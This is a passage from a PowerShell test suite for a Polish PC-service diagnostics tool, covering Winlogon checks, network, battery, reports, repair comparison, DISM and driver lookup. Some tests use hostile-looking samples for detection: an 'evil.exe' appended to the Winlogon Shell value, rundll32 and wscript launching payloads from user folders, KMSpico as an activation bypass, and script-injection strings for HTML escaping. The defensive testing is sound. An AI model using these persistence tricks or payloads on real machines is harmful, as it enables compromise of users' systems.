Assert-Equal 'ESU: opis kodu 3' (Get-SdEsuConsumerText 3) 'urządzenie zapisane'
Assert-Equal 'ESU: brak kodu' (Get-SdEsuConsumerText $null) ''
$lcE = (Get-SdData 'lifecycle').Esu['19045']
Assert-Equal 'lifecycle: ESU konsumenckie do 2027-10-12' $lcE.Consumer '2027-10-12'
Assert-Equal 'lifecycle: 3 identyfikatory licencji ESU' $lcE.ActivationIds.Count 3
Assert-Equal 'lifecycle: Windows 11 26H2' (Get-SdData 'lifecycle').Builds['26300'].Name 'Windows 11 26H2'

# ---------------------------------------------------------------- bezpieczenstwo, siec, bateria, autostart
$sr = $env:SystemRoot
Assert-That 'Userinit domyslny' (Test-SdDefaultWinlogon -Value ($sr + '\system32\userinit.exe,') -Kind Userinit)
Assert-That 'Userinit: Windows na dysku D:' (Test-SdDefaultWinlogon -Value 'D:\Windows\system32\userinit.exe,' -Kind Userinit -SystemRoot 'D:\Windows')
Assert-That 'Userinit ze zmienna srodowiskowa' (Test-SdDefaultWinlogon -Value '%SystemRoot%\system32\userinit.exe' -Kind Userinit)
Assert-That 'Userinit z dopisanym programem' (-not (Test-SdDefaultWinlogon -Value ($sr + '\system32\userinit.exe,C:\Users\Public\x.exe') -Kind Userinit))
Assert-That 'Shell domyslny' (Test-SdDefaultWinlogon -Value 'explorer.exe' -Kind Shell)
Assert-That 'Shell z dopisanym programem' (-not (Test-SdDefaultWinlogon -Value 'explorer.exe, C:\ProgramData\evil.exe' -Kind Shell))
Assert-That 'Shell podmieniony' (-not (Test-SdDefaultWinlogon -Value 'C:\kiosk\app.exe' -Kind Shell))
$adm = @(
    [pscustomobject]@{ IfIndex = 5; StatusCode = 2; Virtual = $false; Gateway = @('192.168.1.1') }
    [pscustomobject]@{ IfIndex = 9; StatusCode = 2; Virtual = $true; Gateway = @() }
    [pscustomobject]@{ IfIndex = 7; StatusCode = 2; Virtual = $false; Gateway = @('10.0.0.1') }
)
$rts = @(
    [pscustomobject]@{ IfIndex = 9; NextHop = '0.0.0.0'; Metric = 1 }
    [pscustomobject]@{ IfIndex = 5; NextHop = '192.168.1.1'; Metric = 50 }
    [pscustomobject]@{ IfIndex = 7; NextHop = '10.0.0.1'; Metric = 35 }
)
Assert-Equal 'brama: najnizsza metryka na karcie fizycznej, bez VPN' (Select-SdGateway -Adapters $adm -Routes $rts) '10.0.0.1'
Assert-Equal 'brama: bez tras - pierwsza karta fizyczna' (Select-SdGateway -Adapters $adm -Routes @()) '192.168.1.1'
Assert-Equal 'brama: tylko VPN' (Select-SdGateway -Adapters @($adm[1]) -Routes @($rts[0])) ''
$bat = [pscustomobject]@{ PNPDeviceID = 'ACPI\PNP0C0A\2'; Name = 'BAT-B' }
$stat = @([pscustomobject]@{ InstanceName = 'ACPI\PNP0C0A\1_0'; DeviceName = 'BAT-A'; DesignedCapacity = 50000 }, [pscustomobject]@{ InstanceName = 'ACPI\PNP0C0A\2_0'; DeviceName = 'BAT-B'; DesignedCapacity = 42000 })
$fullc = @([pscustomobject]@{ InstanceName = 'ACPI\PNP0C0A\2_0'; FullChargedCapacity = 30000 }, [pscustomobject]@{ InstanceName = 'ACPI\PNP0C0A\1_0'; FullChargedCapacity = 45000 })
Assert-Equal 'bateria: dopasowanie po InstanceName' (Select-SdBatteryData -Battery $bat -Items $stat -Static $stat -BatteryCount 2).DesignedCapacity 42000
Assert-Equal 'bateria: inna kolejnosc instancji' (Select-SdBatteryData -Battery $bat -Items $fullc -Static $stat -BatteryCount 2).FullChargedCapacity 30000
Assert-Equal 'bateria: dopasowanie po nazwie' (Select-SdBatteryData -Battery ([pscustomobject]@{ PNPDeviceID = ''; Name = 'BAT-A' }) -Items $fullc -Static $stat -BatteryCount 2).FullChargedCapacity 45000
Assert-That 'bateria: bez dopasowania przy 2 bateriach' ($null -eq (Select-SdBatteryData -Battery ([pscustomobject]@{ PNPDeviceID = ''; Name = '' }) -Items $fullc -Static $stat -BatteryCount 2))
Assert-Equal 'rundll32: biblioteka z argumentow' (@(Get-SdHostPayload -Command 'rundll32.exe C:\Users\Jan\AppData\Local\Temp\abc.dll,Start' -HostPath 'C:\Windows\System32\rundll32.exe') -join '|') 'C:\Users\Jan\AppData\Local\Temp\abc.dll'
Assert-Equal 'wscript: skrypt ze spacja w nazwie' (@(Get-SdHostPayload -Command '"C:\Windows\System32\wscript.exe" //B "C:\Users\Public\run me.vbs"' -HostPath 'C:\Windows\System32\wscript.exe') -join '|') 'C:\Users\Public\run me.vbs'
Assert-Equal 'rundll32 z biblioteka systemowa bez sciezki' @(Get-SdHostPayload -Command 'C:\Windows\System32\rundll32.exe shell32.dll,Control_RunDLL' -HostPath 'C:\Windows\System32\rundll32.exe').Count 0
Assert-Equal 'zwykly program nie jest posrednikiem' @(Get-SdHostPayload -Command '"C:\Program Files\App\app.exe" -min' -HostPath 'C:\Program Files\App\app.exe').Count 0

# ---------------------------------------------------------------- uruchamianie: cytowanie argumentow
Assert-Equal 'cmdarg: prosty' (Format-SdCmdArg 'abc') 'abc'
Assert-Equal 'cmdarg: spacja' (Format-SdCmdArg 'Jan Kowalski') '"Jan Kowalski"'
Assert-Equal 'cmdarg: cudzyslow' (Format-SdCmdArg 'a"b') '"a\"b"'
Assert-Equal 'cmdarg: ukosnik na koncu' (Format-SdCmdArg 'C:\x y\') '"C:\x y\\"'
Assert-Equal 'cmdarg: pusty' (Format-SdCmdArg '') '""'
$argScript = Join-Path ([IO.Path]::GetTempPath()) ('sdargs-' + [guid]::NewGuid().ToString('N') + '.ps1')
[IO.File]::WriteAllText($argScript, '[Console]::Out.Write(($args -join "|"))')
$vals = @('Jan Kowalski', 'a"b', 'C:\x y\', 'zwykly')
$psExe = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
$rt = Invoke-Native -File $psExe -Arguments ('-NoProfile -ExecutionPolicy Bypass -File ' + (Format-SdCmdArg $argScript) + ' ' + (($vals | ForEach-Object { Format-SdCmdArg $_ }) -join ' ')) -TimeoutSec 60
Remove-Item -LiteralPath $argScript -Force
Assert-Equal 'cmdarg: argumenty dochodza do powershell.exe -File bez zmian' $rt.StdOut.Trim() ($vals -join '|')

# ---------------------------------------------------------------- indeks stabilnosci
$now = New-Object DateTime(2026, 10, 22, 15, 0, 0)
$pts = @()
for ($h = 480; $h -ge 0; $h--) { $pts += [pscustomobject]@{ Time = $now.AddHours(-$h); Index = $(if ($h -gt 192) { 9.8 } elseif ($h -gt 48) { 4.5 } else { 6.2 }) } }
$st1 = Get-SdStabilitySummary -Points $pts -Now $now
Assert-Equal 'stabilnosc: biezacy' $st1.Current 6.2
Assert-Equal 'stabilnosc: minimum 7 dni' $st1.Min7 4.5
Assert-Equal 'stabilnosc: tydzien temu' $st1.WeekAgo 4.5
Assert-Equal 'stabilnosc: 6,2 = info' $st1.Status 'info'
Assert-That 'stabilnosc: minima dzienne' (@($st1.Daily).Count -ge 20)
Assert-Equal 'stabilnosc: 10 = ok' (Get-SdStabilitySummary -Points @([pscustomobject]@{ Time = $now.AddHours(-1); Index = 10.0 }) -Now $now).Status 'ok'
Assert-Equal 'stabilnosc: 3 = warn' (Get-SdStabilitySummary -Points @([pscustomobject]@{ Time = $now; Index = 3.0 }) -Now $now).Status 'warn'
Assert-Equal 'stabilnosc: spadek o 2,5 pkt = info' (Get-SdStabilitySummary -Points @([pscustomobject]@{ Time = $now.AddDays(-8); Index = 10.0 }, [pscustomobject]@{ Time = $now; Index = 7.5 }) -Now $now).Status 'info'
Assert-That 'stabilnosc: brak danych' ($null -eq (Get-SdStabilitySummary -Points @() -Now $now))

# ---------------------------------------------------------------- bezpiecznik WMI i ochrona testu dysku
$global:SD = New-SdContext -Root $SdRoot
for ($q = 0; $q -lt 3; $q++) { Register-SdWmiSlow 'test' 41 }
Assert-That 'WMI: bezpiecznik po 3 przekroczeniach czasu' ($global:SD.Cache['WmiBroken'] -eq $true)
Assert-Equal 'WMI: kolejne zapytania pomijane' @(Get-Cim Win32_OperatingSystem).Count 0
$savedChecks = $global:SdChecks
$global:SdChecks = New-Object System.Collections.ArrayList
Invoke-SdScan
$global:SdChecks = $savedChecks
$wf = @($global:SD.Findings | Where-Object { $_.CheckId -eq 'sys.wmi' })
Assert-That 'WMI: wynik krytyczny po zadzialaniu bezpiecznika' ($wf.Count -eq 1 -and $wf[0].Status -eq 'crit')
$global:SD = New-SdContext -Root $SdRoot
$sysLetter = ([string]$env:SystemDrive).ToUpper()
$global:SD.Cache['VolumeMaps'] = @{ V = [pscustomobject]@{ DevToDisk = @{}; DevToLetter = @{}; LetterToDisk = @{ $sysLetter = 0 } } }
$global:SD.Cache['Disks'] = @{ V = @([pscustomobject]@{ Index = 0; IsSystem = $true; Health = 'Healthy'; WmiStatus = 'OK'; Operational = 'OK' }) }
Assert-Equal 'test dysku: zdrowy dysk' (Get-SdSystemDiskRisk) ''
$global:SD.Cache['DiskStatus'] = @{ 0 = 'crit' }
Assert-That 'test dysku: pominiety przy krytycznym SMART' ((Get-SdSystemDiskRisk) -match 'objawy awarii')
$global:SD.Cache['DiskStatus'] = @{ 0 = 'ok' }
$global:SD.Cache['Disks'] = @{ V = @([pscustomobject]@{ Index = 0; IsSystem = $true; Health = 'Unhealthy'; WmiStatus = 'OK'; Operational = 'OK' }) }
Assert-That 'test dysku: pominiety, gdy Windows zglasza awarie' ((Get-SdSystemDiskRisk) -match 'Windows zgłasza')

# ---------------------------------------------------------------- widok dla klienta (neutralny opis licencji)
$global:SD = New-SdContext -Root $SdRoot -Level Quick
$global:SD.Cur.Category = 'updates'; $global:SD.Cur.Id = 'up.activation'
Add-Finding 'Aktywacja Windows' -Status warn -Value 'Aktywowany zbiorczo (KMS) przez kms.example' -Details 'Serwer KMS: kms.example' -Advice 'Zweryfikuj legalność licencji' -CustomerStatus info -CustomerValue 'Aktywowany'
$global:SD.Cur.Category = 'software'; $global:SD.Cur.Id = 'sw.installed'
Add-Finding 'Narzędzia do obchodzenia aktywacji' -Status warn -Value 'KMSpico' -CustomerTitle 'Programy wysokiego ryzyka' -CustomerStatus warn -CustomerValue 'Wykryto programy wysokiego ryzyka'
$global:SD.Started = Get-Date; $global:SD.Finished = Get-Date
$cv = @(Get-SdCustomerFindings $global:SD.Findings)
Assert-That 'widok klienta: neutralny opis licencji' ($cv[0].Status -eq 'info' -and $cv[0].Value -eq 'Aktywowany' -and -not $cv[0].Details -and -not $cv[0].Advice)
Assert-Equal 'widok klienta: zmieniony tytul' $cv[1].Title 'Programy wysokiego ryzyka'
$resK = Get-SdResult
$custK = New-SdHtmlReport -Result $resK -Mode Customer
$techK = New-SdHtmlReport -Result $resK -Mode Technical
Assert-That 'raport klienta bez KMS i nazw aktywatorow' ($custK -notmatch 'KMS' -and $custK -notmatch 'kms\.example' -and $custK -notmatch 'obchodzenia')
Assert-That 'raport techniczny z pelnym opisem' ($techK -match 'KMSpico' -and $techK -match 'kms\.example')
Assert-That 'podsumowanie TXT bez KMS' ((New-SdTextReport -Result $resK) -notmatch 'KMS')

# ---------------------------------------------------------------- porownanie przed / po naprawie
function New-MockResult {
    param([object[]]$F, [string]$Level = 'Quick', [string]$Pc = 'PC1', [string]$Serial = 'S1', [datetime]$When)
    $fs = @()
    foreach ($x in $F) { $fs += [pscustomobject]@{ CheckId = $x[0]; Category = $x[1]; Title = $x[2]; Status = $x[3]; Value = $x[4]; Details = ''; Advice = ('Rada: ' + $x[2]); Private = $false; Customer = $null; Time = '' } }
    return [pscustomobject]@{ Tool = 'SerwisDiag'; Version = '1'; Generated = $When; Level = $Level; IsAdmin = $true; Meta = @{ ComputerName = $Pc; Serial = $Serial; Model = 'Model X'; Ticket = 'Z-1' }; Findings = $fs }
}
$mb = New-MockResult -When (Get-Date).AddHours(-3) -F @(
    , @('st.disks', 'storage', 'Dysk 0: SSD', 'crit', 'pending 5')
    , @('st.volumes', 'storage', 'Wolumin C:', 'warn', '3 GB wolne')
    , @('sw.startup', 'software', 'Autostart', 'warn', '20 wpisów')
    , @('ev.crash', 'events', 'Niebieskie ekrany (BSOD)', 'crit', '5 w 90 dni')
    , @('pw.battery', 'power', 'Bateria', 'ok', 'kondycja 90%')
    , @('nw.adapters', 'network', 'Brama domyślna karty Wi-Fi', 'warn', 'Brak bramy')
    , @('tt.disk', 'tests', 'Test szybkości dysku', 'warn', 'wolno'))
$ma = New-MockResult -When (Get-Date) -F @(
    , @('st.disks', 'storage', 'Dysk 0: SSD', 'ok', 'stan dobry')
    , @('st.volumes', 'storage', 'Wolumin C:', 'warn', '8 GB wolne')
    , @('sw.startup', 'software', 'Autostart', 'ok', '6 wpisów')
    , @('ev.crash', 'events', 'Niebieskie ekrany (BSOD)', 'warn', '5 w 90 dni (ostatnie 30 dni: 1)')
    , @('pw.battery', 'power', 'Bateria', 'warn', 'kondycja 60%')
    , @('nw.adapters', 'network', 'Połączenie sieciowe', 'ok', 'Aktywne'))
$cmp = New-SdComparison -Before $mb -After $ma -WorkDone ('Wymiana dysku' + "`n" + 'Czyszczenie autostartu <b>')
$kinds = @{}
foreach ($it in $cmp.Items) { $kinds[$it.Title] = $it.Kind }
Assert-Equal 'porownanie: dysk rozwiazany' $kinds['Dysk 0: SSD'] 'resolved'
Assert-Equal 'porownanie: wolumin bez zmian' $kinds['Wolumin C:'] 'remaining'
Assert-Equal 'porownanie: BSOD zlagodzone' $kinds['Niebieskie ekrany (BSOD)'] 'improved'
Assert-Equal 'porownanie: bateria - nowy problem' $kinds['Bateria'] 'new'
Assert-Equal 'porownanie: zniknal wynik testu wykonanego ponownie' $kinds['Brama domyślna karty Wi-Fi'] 'resolved'
Assert-Equal 'porownanie: test niewykonany po naprawie' $kinds['Test szybkości dysku'] 'notrechecked'
Assert-Equal 'porownanie: rozwiazane' $cmp.Counts['resolved'] 3
Assert-That 'porownanie: ten sam komputer, bez uwag' ($cmp.SameComputer -eq $true -and @($cmp.Notes).Count -eq 0)
$hT = New-SdComparisonHtml -Comparison $cmp -Mode Technical -Settings @{ ShopName = 'Serwis' }
$hC = New-SdComparisonHtml -Comparison $cmp -Mode Customer -Settings @{ ShopName = 'Serwis' }
Assert-That 'porownanie HTML: wykonane czynnosci (zakodowane)' ($hC -match 'Wymiana dysku' -and $hT -match 'Czyszczenie autostartu &lt;b&gt;')
Assert-That 'porownanie HTML: rozwiazano 3 z 6 (klient bez niesprawdzonego ponownie: 3 z 5)' ($hT -match 'Rozwiązano 3 z 6 problem' -and $hC -match 'Rozwiązano 3 z 5 problem')   # "ó" jest kodowane jako encja HTML
Assert-That 'porownanie HTML klienta bez sekcji technicznych' ($hC -notmatch 'Nie sprawdzono ponownie' -and $hT -match 'Nie sprawdzono ponownie')
Assert-That 'porownanie HTML: brak var(--)' ($hT -notmatch 'var\(--' -and $hC -notmatch 'var\(--')
$cmp2 = New-SdComparison -Before $mb -After (New-MockResult -When (Get-Date) -Pc 'INNY' -Serial 'S2' -F @())
Assert-That 'porownanie: rozne komputery' ($cmp2.SameComputer -eq $false -and @($cmp2.Notes).Count -ge 1)
$mb2 = New-MockResult -When (Get-Date).AddHours(-1) -F (, @('up.activation', 'updates', 'Aktywacja Windows', 'warn', 'KMS'))
$mb2.Findings[0].Customer = [pscustomobject]@{ Title = ''; Status = 'info'; Value = 'Aktywowany'; Advice = '' }
$ma2 = New-MockResult -When (Get-Date) -F (, @('up.activation', 'updates', 'Aktywacja Windows', 'ok', 'Aktywowany (kanał: Retail)'))
$cmp3 = New-SdComparison -Before $mb2 -After $ma2
Assert-That 'porownanie: widok klienta liczony osobno' ($cmp3.Counts['resolved'] -eq 1 -and $cmp3.CustomerCounts['resolved'] -eq 0)
Assert-That 'porownanie klienta: bez KMS' ((New-SdComparisonHtml -Comparison $cmp3 -Mode Customer) -notmatch 'KMS')

# ---------------------------------------------------------------- raport JSON: zapis i odczyt do porownania
$global:SD = New-SdContext -Root $SdRoot -Level Full
$global:SD.Cur.Category = 'updates'; $global:SD.Cur.Id = 'up.activation'
Set-SdMeta 'ComputerName' 'PCJ'; Set-SdMeta 'Serial' 'SER-1'
Add-Finding 'Aktywacja Windows' -Status warn -Value 'KMS' -CustomerStatus info -CustomerValue 'Aktywowany'
Add-Finding 'Numer' -Status info -Value 'SER-1' -Private
$global:SD.Started = Get-Date; $global:SD.Finished = Get-Date
$jr = Get-SdResult
$jp = Join-Path ([IO.Path]::GetTempPath()) ('sdjson-' + [guid]::NewGuid().ToString('N') + '.json')
[IO.File]::WriteAllText($jp, (ConvertTo-SdJsonReport -Result $jr -IncludePrivate), (New-Object Text.UTF8Encoding($false)))
$imp = Import-SdReportJson $jp
Remove-Item -LiteralPath $jp -Force
Assert-Equal 'JSON: liczba wynikow' @($imp.Findings).Count 2
Assert-Equal 'JSON: tryb' $imp.Level 'Full'
Assert-That 'JSON: widok klienta i prywatnosc zachowane' ($imp.Findings[0].Customer.Value -eq 'Aktywowany' -and $imp.Findings[1].Private)
Assert-Equal 'JSON: meta' $imp.Meta['ComputerName'] 'PCJ'
Assert-That 'JSON: data wygenerowania' ($imp.Generated -is [datetime])
$badJson = Join-Path ([IO.Path]::GetTempPath()) ('sdjson-' + [guid]::NewGuid().ToString('N') + '.json')
[IO.File]::WriteAllText($badJson, '{"a":1}')
$err = ''
try { [void](Import-SdReportJson $badJson) } catch { $err = $_.Exception.Message }
Remove-Item -LiteralPath $badJson -Force
Assert-That 'JSON: obcy plik odrzucony' ($err -match 'nie jest raport') $err
$rd = Join-Path ([IO.Path]::GetTempPath()) ('sdrep-' + [guid]::NewGuid().ToString('N'))
[void](New-Item -ItemType Directory -Path $rd)
$mk = { param($n, $age) $p = Join-Path $rd $n; [IO.File]::WriteAllText($p, '{}'); (Get-Item -LiteralPath $p).LastWriteTime = (Get-Date).AddHours(-$age); $p }
$p1 = & $mk 'Z-1_MOJPC_20261020-1000.json' 50
$p2 = & $mk 'MOJPC_20261021-1000.json' 20
$p3 = & $mk 'Z-2_MOJPC_20261022-0900.json' 5
$p4 = & $mk 'Z-1_INNYPC_20261022-1000.json' 1
Assert-Equal 'szukanie raportu: najnowszy tego komputera' (Find-SdReportJson -Dir $rd -ComputerName 'MOJPC') $p3
Assert-Equal 'szukanie raportu: to samo zlecenie' (Find-SdReportJson -Dir $rd -ComputerName 'MOJPC' -Ticket 'Z-1') $p1
Assert-Equal 'szukanie raportu: z wykluczeniem' (Find-SdReportJson -Dir $rd -ComputerName 'MOJPC' -Exclude @($p3)) $p2
Remove-Item -LiteralPath $rd -Recurse -Force

# ---------------------------------------------------------------- tryb bez internetu
$global:SD = New-SdContext -Root $SdRoot -Offline
Assert-That 'offline: Test-SdOffline' (Test-SdOffline)
$savedChecks = $global:SdChecks
$global:SdChecks = New-Object System.Collections.ArrayList
Register-Check -Id 'x.net' -Category 'network' -Title 'Test z internetem' -NeedsInternet -Script { Add-Finding 'Nie powinno sie wykonac' -Status crit }
Register-Check -Id 'x.local' -Category 'system' -Title 'Test lokalny' -Script { Add-Finding 'Lokalny' -Status ok -Value 'tak' }
Invoke-SdScan
$global:SdChecks = $savedChecks
$fx = @($global:SD.Findings | Where-Object { $_.CheckId -like 'x.*' })
Assert-That 'offline: test wymagajacy internetu pominiety' (@($fx | Where-Object { $_.CheckId -eq 'x.net' -and $_.Status -eq 'skip' -and $_.Value -match 'bez internetu' }).Count -eq 1 -and @($fx | Where-Object { $_.Status -eq 'crit' }).Count -eq 0)
Assert-That 'offline: test lokalny wykonany' (@($fx | Where-Object { $_.CheckId -eq 'x.local' -and $_.Status -eq 'ok' }).Count -eq 1)
Assert-That 'offline: zapisane w metadanych' ($global:SD.Meta['Offline'] -eq $true)
$global:SD.Started = Get-Date; $global:SD.Finished = Get-Date
Assert-That 'offline: informacja w raporcie klienta' ((New-SdHtmlReport -Result (Get-SdResult) -Mode Customer) -match 'bez dost')
$global:SD = New-SdContext -Root $SdRoot
Assert-That 'online: Test-SdOffline = false' (-not (Test-SdOffline))
$netIds = @($global:SdChecks | Where-Object { $_.NeedsInternet } | ForEach-Object { $_.Id } | Sort-Object)
Assert-Equal 'testy wymagajace internetu oznaczone' ($netIds -join ',') 'dr.wu,tt.net,up.pendingsearch'
$mbo = New-MockResult -When (Get-Date).AddHours(-1) -F @(); $mbo.Meta['Offline'] = $true
Assert-That 'porownanie: uwaga o trybie bez internetu' (@((New-SdComparison -Before $mbo -After (New-MockResult -When (Get-Date) -F @())).Notes | Where-Object { $_ -match 'bez internetu' }).Count -eq 1)

# ---------------------------------------------------------------- DISM z plyty/ISO: wybor edycji
Assert-Equal 'rodzina kompilacji: Win10 22H2' (Get-SdBuildFamily 19045) 19041
Assert-Equal 'rodzina kompilacji: Win11 26H2' (Get-SdBuildFamily 26300) 26100
Assert-Equal 'rodzina kompilacji: inna' (Get-SdBuildFamily 22000) 22000
Assert-Equal 'architektura 9' (ConvertTo-SdArchName 9) 'x64'
Assert-Equal 'architektura arm64' (ConvertTo-SdArchName 'ARM64') 'ARM64'
$imgs = @(
    [pscustomobject]@{ Index = 1; Name = 'Windows 11 Home'; EditionId = 'Core'; Build = 26100; Arch = 'x64'; Languages = @('pl-PL') }
    [pscustomobject]@{ Index = 3; Name = 'Windows 11 Education'; EditionId = 'Education'; Build = 26100; Arch = 'x64'; Languages = @('pl-PL') }
    [pscustomobject]@{ Index = 6; Name = 'Windows 11 Pro'; EditionId = 'Professional'; Build = 26100; Arch = 'x64'; Languages = @('pl-PL') }
)
$si = Select-SdImageIndex -Images $imgs -EditionId 'Professional' -Build 26100 -Arch 'x64' -Language 'pl-PL'
Assert-That 'ISO: ta sama edycja, bez uwag' ($si.Index -eq 6 -and @($si.Problems).Count -eq 0)
$si = Select-SdImageIndex -Images $imgs -EditionId 'CoreSingleLanguage' -Build 26100 -Arch 'x64' -Language 'pl-PL'
Assert-That 'ISO: Home Single Language -> Home' ($si.Index -eq 1 -and @($si.Problems).Count -eq 1)
$si = Select-SdImageIndex -Images $imgs -EditionId 'Professional' -Build 26300 -Arch 'x64' -Language 'pl-PL'
Assert-That 'ISO: 24H2 naprawia 26H2 (ta sama rodzina)' ($si.Index -eq 6 -and (@($si.Problems) -join ' ') -match 'rodzina')
Assert-Equal 'ISO: inna wersja Windows' (Select-SdImageIndex -Images $imgs -EditionId 'Professional' -Build 19045 -Arch 'x64' -Language 'pl-PL').Index 0
Assert-Equal 'ISO: inna architektura' (Select-SdImageIndex -Images $imgs -EditionId 'Professional' -Build 26100 -Arch 'ARM64' -Language 'pl-PL').Index 0
Assert-That 'ISO: inny jezyk - uwaga' ((@((Select-SdImageIndex -Images $imgs -EditionId 'Professional' -Build 26100 -Arch 'x64' -Language 'en-US').Problems) -join ' ') -match 'Język')
Assert-Equal 'DISM /Source wim' (Get-SdDismSourceArg -ImagePath 'E:\sources\install.wim' -Index 6) '/Source:wim:E:\sources\install.wim:6'
Assert-Equal 'DISM /Source esd' (Get-SdDismSourceArg -ImagePath 'E:\sources\install.esd' -Index 2) '/Source:esd:E:\sources\install.esd:2'
Assert-Equal 'DISM /Source ze spacja' (Get-SdDismSourceArg -ImagePath 'C:\Obrazy Win\install.wim' -Index 1) '"/Source:wim:C:\Obrazy Win\install.wim:1"'
Assert-That 'DISM: plik spoza nosnika odrzucony' ((Resolve-SdInstallImage 'C:\nie-ma-takiego\install.wim').Error -match 'Nie znaleziono')

# ---------------------------------------------------------------- sterowniki: Windows Update, Katalog, producent
$drv = @(
    [pscustomobject]@{ UpdateId = 'a'; Title = 'Intel - Display - 31.0'; Class = 'Display'; Manufacturer = 'Intel'; Provider = 'Intel'; Date = (Get-Date '2026-01-02'); SizeBytes = 500MB; Optional = $true; DeviceProblem = 0 }
    [pscustomobject]@{ UpdateId = 'b'; Title = 'Realtek - Net - 10.1'; Class = 'Net'; Manufacturer = 'Realtek'; Provider = 'Realtek'; Date = (Get-Date '2025-05-06'); SizeBytes = 2MB; Optional = $true; DeviceProblem = 28 }
    [pscustomobject]@{ UpdateId = 'c'; Title = 'Lenovo - System - 26.9'; Class = 'System'; Manufacturer = 'Lenovo'; Provider = 'Lenovo'; Date = (Get-Date '2026-09-09'); SizeBytes = 20MB; Optional = $false; DeviceProblem = 0 }
)
Assert-Equal 'sterowniki: domyslny wybor (zalecane + naprawiajace)' ((@(Select-SdDriversToInstall $drv | ForEach-Object { $_.UpdateId }) | Sort-Object) -join ',') 'b,c'
Assert-Equal 'sterowniki: ocena z urzadzeniem z bledem' (Get-SdDriverUpdateStatus $drv) 'warn'
Assert-Equal 'sterowniki: ocena bez bledow' (Get-SdDriverUpdateStatus @($drv[0], $drv[2])) 'info'
Assert-Equal 'sterowniki: brak' (Get-SdDriverUpdateStatus @()) 'ok'
$dr = @(ConvertTo-SdDriverRows $drv)
Assert-That 'sterowniki: tabela - urzadzenie z bledem na poczatku' ($dr[0].Sterownik -match 'Realtek' -and $dr[0].Uwagi -match 'kod 28')
Assert-Equal 'Windows Update: kod 2' (Get-SdWuResultText 2) 'zainstalowano'
Assert-Equal 'Katalog: PCI skrocone' (Get-SdCatalogQuery 'PCI\VEN_8086&DEV_A0F0&SUBSYS_00011028&REV_20') 'PCI\VEN_8086&DEV_A0F0'
Assert-Equal 'Katalog: USB skrocone' (Get-SdCatalogQuery 'USB\VID_0BDA&PID_8153&REV_3000') 'USB\VID_0BDA&PID_8153'
Assert-Equal 'Katalog: ACPI' (Get-SdCatalogQuery 'ACPI\INT33A1') 'ACPI\INT33A1'
Assert-Equal 'Katalog: adres' (Get-SdCatalogUrl 'PCI\VEN_8086&DEV_A0F0&REV_20') 'https://www.catalog.update.microsoft.com/Search.aspx?q=PCI%5CVEN_8086%26DEV_A0F0'
Assert-Equal 'Katalog: pusty identyfikator' (Get-SdCatalogUrl '') ''
$vi = Get-SdVendorSupportInfo -Manufacturer 'LENOVO' -Model 'LOQ 15IAX9' -Serial 'PF1ABCDE'
Assert-That 'producent: Lenovo po numerze seryjnym' ($vi.Url -eq 'https://pcsupport.lenovo.com/' -and $vi.CopyText -eq 'PF1ABCDE' -and $vi.CopyLabel -eq 'numer seryjny')
$vi = Get-SdVendorSupportInfo -Manufacturer 'ASUSTeK COMPUTER INC.' -Model 'VivoBook 15' -Serial 'X1'
Assert-That 'producent: ASUS po modelu' ($vi.Vendor -eq 'ASUS' -and $vi.CopyText -eq 'VivoBook 15')
$vi = Get-SdVendorSupportInfo -Manufacturer 'System manufacturer' -Model 'System Product Name' -Serial 'System Serial Number' -BoardManufacturer 'ASUSTeK COMPUTER INC.' -BoardProduct 'PRIME B450M-A'
Assert-That 'producent: komputer skladany -> plyta glowna' ($vi.Vendor -eq 'ASUS' -and $vi.Board -and $vi.CopyText -eq 'PRIME B450M-A' -and $vi.CopyLabel -match 'płyty')
$vi = Get-SdVendorSupportInfo -Manufacturer 'Dell Inc.' -Model 'Latitude 5490' -Serial ''
Assert-That 'producent: Dell bez numeru seryjnego -> model' ($vi.Vendor -eq 'Dell' -and $vi.CopyText -eq 'Latitude 5490' -and $vi.CopyLabel -eq 'model')
$vi = Get-SdVendorSupportInfo -Manufacturer 'Medion' -Model 'Akoya E15' -Serial 'Z'
Assert-That 'producent: nieznany -> wyszukiwarka' ($vi.IsSearch -and $vi.Url -like 'https://www.bing.com/search?q=Medion%20Akoya%20E15*')

# ---------------------------------------------------------------- raport: linki
$lk = ConvertTo-SdHtml 'Zobacz https://www.catalog.update.microsoft.com/Search.aspx?q=PCI%5CVEN_8086%26DEV_A0F0. Koniec'
Assert-That 'HTML: adres https jako link, kropka poza linkiem' ($lk -match '<a href="https://www\.catalog\.update\.microsoft\.com/Search\.aspx\?q=PCI%5CVEN_8086%26DEV_A0F0" target="_blank" rel="noopener noreferrer">' -and $lk -match '</a>\. Koniec')
Assert-That 'HTML: javascript: i http: nie sa linkami' ((ConvertTo-SdHtml 'javascript:alert(1) http://x.pl') -notmatch '<a ')
Assert-That 'HTML: znacznik w adresie zakodowany' ((ConvertTo-SdHtml 'https://x.pl/"><script>') -notmatch '<script>')
Assert-That 'HTML: komorka z adresem jako link "otwórz"' ((ConvertTo-SdHtmlCell 'https://www.catalog.update.microsoft.com/Search.aspx?q=a%26b') -match '^<a href="https://www\.catalog\.update\.microsoft\.com/Search\.aspx\?q=a%26b"[^>]*>otwórz</a>$')

# ---------------------------------------------------------------- naprawy: katalog
$global:SD = New-SdContext -Root $SdRoot
$fixIds = @($global:SdFixes | ForEach-Object { $_.Id })
Assert-That 'naprawy: co najmniej 25 w katalogu' ($fixIds.Count -ge 25) ([string]$fixIds.Count)
Assert-Equal 'naprawy: unikalne Id' (@($fixIds | Select-Object -Unique).Count) $fixIds.Count
$checkIds = @($global:SdChecks | ForEach-Object { $_.Id }) + 'sys.wmi'   # sys.wmi dodaje sam silnik po skanowaniu
$badCovers = @()
foreach ($f in $global:SdFixes) {
    foreach ($cv in @($f.Covers)) {
        $p = ([string]$cv) -split '\|', 2
        if ($checkIds -notcontains $p[0]) { $badCovers += ($f.Id + ' -> ' + $cv) }
        if ($p.Count -gt 1) { try { [void][regex]::new } catch { }; try { [void](New-Object System.Text.RegularExpressions.Regex($p[1])) } catch { $badCovers += ($f.Id + ' (regex) -> ' + $cv) } }
    }
}
Assert-That 'naprawy: Covers wskazuja istniejace testy diagnostyki' ($badCovers.Count -eq 0) ($badCovers -join '; ')
Assert-That 'naprawy: kazda ma opis' (@($global:SdFixes | Where-Object { -not $_.Description }).Count -eq 0)

# ---------------------------------------------------------------- naprawy: wybor i blokady (dane przykladowe)
function New-MockCtx {
    param([object[]]$F, [bool]$Admin = $true, [bool]$Off = $false)
    $fs = @()
